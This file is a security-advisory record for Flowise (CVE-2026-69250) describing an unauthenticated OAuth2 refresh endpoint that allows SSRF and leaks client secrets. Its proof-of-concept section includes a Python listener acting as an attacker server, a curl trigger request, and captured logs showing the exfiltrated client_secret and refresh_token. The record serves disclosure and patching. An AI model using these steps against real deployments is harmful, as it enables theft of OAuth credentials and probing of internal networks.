@@ -1,0 +1,282 @@
+advisory_id: GHSA-r745-8hwv-h473
+datasource_id: github_osv/GHSA-r745-8hwv-h473
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-r745-8hwv-h473/GHSA-r745-8hwv-h473.json
+aliases:
+  - CVE-2026-69250
+summary: |
+  Flowise: Unauthenticated OAuth2 Refresh Enables Non-Blind SSRF and Secret Exfiltration
+  ### Summary
+
+  The OAuth2 token refresh endpoint (`POST /api/v1/oauth2-credential/refresh/:credentialId`) is unauthenticated by design (it is in the public whitelist) and performs a server-side HTTP request to a credential-controlled URL (`accessTokenUrl`) without SSRF protections. In runtime validation, this endpoint was reachable without auth, triggered outbound POST requests to an attacker-controlled server, and reflected the full remote response body to the caller (`tokenInfo`), confirming non-blind SSRF and credential secret exfiltration.
+
+  ### Details
+
+  The vulnerability is in `dist/routes/oauth2/index.js` (container runtime build), under path prefix `/api/v1/oauth2-credential`.
+
+  Confirmed in runtime code:
+
+  1. **Unauthenticated route via whitelist**
+     - `dist/utils/constants.js` includes:
+       - `/api/v1/oauth2-credential/callback`
+       - `/api/v1/oauth2-credential/refresh`
+     - `dist/index.js` auth middleware uses:
+       - `const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))`
+     - Therefore `/api/v1/oauth2-credential/refresh/:credentialId` is treated as whitelisted.
+
+  2. **User-controlled SSRF target**
+     - In refresh handler (`dist/routes/oauth2/index.js`):
+       - loads credential by `credentialId`
+       - decrypts credential data
+       - reads `accessTokenUrl`
+       - executes:
+         - `axios.post(tokenUrl, new URLSearchParams(refreshRequestData).toString(), ...)`
+     - No `secureAxiosRequest()` / denylist wrapper is used in this path.
+
+  3. **Non-blind response reflection**
+     - Response returns:
+       - `tokenInfo: { ...tokenData, ... }`
+     - `tokenData` is the attacker/internal server response body.
+
+  4. **Secrets sent to SSRF target**
+     - Request body includes:
+       - `client_id`
+       - `client_secret`
+       - `grant_type=refresh_token`
+       - `refresh_token`
+
+  ### PoC
+
+  #### Environment used
+
+  - `flowiseai/flowise:latest` container (`localhost:3000`)
+  - Attacker server (`localhost:18081`) returning JSON
+
+  #### Step 1: Start attacker server
+
+  ```bash
+  python3 -u - <<'PY'
+  from http.server import BaseHTTPRequestHandler, HTTPServer
+  import json
+
+  class H(BaseHTTPRequestHandler):
+      def do_POST(self):
+          l = int(self.headers.get('Content-Length','0'))
+          b = self.rfile.read(l).decode('utf-8', errors='replace')
+          print('REQUEST_PATH', self.path, flush=True)
+          print('REQUEST_BODY', b, flush=True)
+          self.send_response(200)
+          self.send_header('Content-Type','application/json')
+          self.end_headers()
+          self.wfile.write(json.dumps({'ok': True, 'source': 'attacker-server', 'echo_len': len(b)}).encode())
+      def log_message(self, fmt, *args):
+          pass
+
+  HTTPServer(('0.0.0.0', 18081), H).serve_forever()
+  PY
+  ```
+
+  #### Step 2: Create OAuth2 credential with attacker `accessTokenUrl` (authenticated action)
+
+  In validation, this was done via authenticated API path (credential creation requires auth/permissions), then refresh was tested publicly.
+
+  Resulting credential ID used in runtime validation:
+
+  - `24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef`
+
+  #### Step 3: Trigger refresh **without auth**
+
+  ```bash
+  curl -i -X POST \
+    http://127.0.0.1:3000/api/v1/oauth2-credential/refresh/24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef \
+    -H 'Content-Type: application/json' \
+    -d '{}'
+  ```
+
+  Observed response:
+
+  ```json
+  {
+    "success": true,
+    "message": "OAuth2 token refreshed successfully",
+    "credentialId": "24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef",
+    "tokenInfo": {
+      "ok": true,
+      "source": "attacker-server",
+      "echo_len": 76,
+      "has_new_refresh_token": false
+    }
+  }
+  ```
+
+  Attacker server logs captured:
+
+  ```text
+  REQUEST_PATH /token
+  REQUEST_BODY client_id=cid2&client_secret=csec2&grant_type=refresh_token&refresh_token=r2
+  ```
+
+  This confirms:
+  - unauthenticated trigger,
+  - server-side POST to attacker-controlled URL,
+  - exfiltration of OAuth2 secrets in POST body,
+  - full response reflection to client (`tokenInfo`).
+
+  ### Impact
+
+  - **Vulnerability class:** Non-blind SSRF + sensitive secret exfiltration.
+  - **Who can set up attack:** Any authenticated user who can create/update OAuth2 credentials.
+  - **Who can trigger attack:** Anyone who knows a valid OAuth2 credential UUID (refresh endpoint is public/whitelisted).
+  - **Technical impact:**
+    - outbound SSRF to attacker/internal targets,
+    - direct leak of `client_secret` and `refresh_token` to SSRF target,
+    - direct response read from target via API response (`tokenInfo`).
+  - **Deployment impact:**
+    - cloud/internal network reachability can expose metadata/internal services depending on egress controls.
+impacted_packages:
+  - purl: pkg:github/flowiseai/flowise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flowiseai/flowise
+        commit: da8b251a9a4c59484ceaf6f71df7406aede7bef2
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.1.2
+    fixed_versions: vers:npm/3.1.3
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+      - pkg:npm/flowise@3.0.13
+      - pkg:npm/flowise@3.1.0
+      - pkg:npm/flowise@3.1.1
+      - pkg:npm/flowise@3.1.2
+    fixed_packages:
+      - pkg:npm/flowise@3.1.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.5'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-r745-8hwv-h473/GHSA-r745-8hwv-h473.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-639
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/commit/da8b251a9a4c59484ceaf6f71df7406aede7bef2
+    reference_type: other
+    reference_id: da8b251a9a4c59484ceaf6f71df7406aede7bef2
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
+    reference_type: other
+    reference_id: flowise@3.1.3
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-r745-8hwv-h473
+    reference_type: other
+    reference_id: GHSA-r745-8hwv-h473
+exploits: []
